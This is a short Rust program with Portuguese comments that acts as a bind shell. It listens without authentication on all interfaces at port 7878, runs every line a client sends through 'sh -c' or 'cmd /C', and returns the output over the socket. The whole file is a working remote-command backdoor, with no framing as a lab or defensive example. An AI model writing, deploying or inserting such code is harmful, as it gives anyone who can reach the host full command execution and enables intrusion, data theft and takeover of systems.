use std::io::{Read, Write}; // Importa módulos para leitura e escrita
use std::net::TcpListener;  // Importa o módulo para criar o servidor TCP

fn main() {
    // Tenta ligar o servidor à porta 7878 em todas as interfaces de rede (0.0.0.0)
    let listener = TcpListener::bind("0.0.0.0:7878").expect("Não foi possível ligar o servidor à porta 7878");
    println!("Escutando na porta 7878");

    // Itera sobre as conexões de entrada
    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("Conexão estabelecida!");

                loop {
                    let mut buffer = [0; 1024]; // Buffer para armazenar os dados lidos do socket
                    // Lê os dados do socket
                    let bytes_read = stream.read(&mut buffer).expect("Falha ao ler do socket");

                    // Se não houver mais dados, quebra o loop
                    if bytes_read == 0 {
                        break;
                    }

                    // Converte os bytes lidos para uma string
                    let command = String::from_utf8_lossy(&buffer[..bytes_read]);
                    println!("Comando recebido: {}", command);

                    // Executa o comando recebido
                    let output = if cfg!(target_os = "windows") {
                        std::process::Command::new("cmd")
                            .args(&["/C", &command])
                            .output()
                            .expect("Falha ao executar o comando")
                    } else {
                        std::process::Command::new("sh")
                            .arg("-c")
                            .arg(&command)
                            .output()
                            .expect("Falha ao executar o comando")
                    };

                    // Envia a saída do comando de volta para o cliente
                    stream.write(&output.stdout).expect("Falha ao escrever no socket");
                    stream.write(&output.stderr).expect("Falha ao escrever no socket");
                }
            }
            Err(e) => {
                eprintln!("Falha ao aceitar a conexão: {}", e);
            }
        }
    }
}
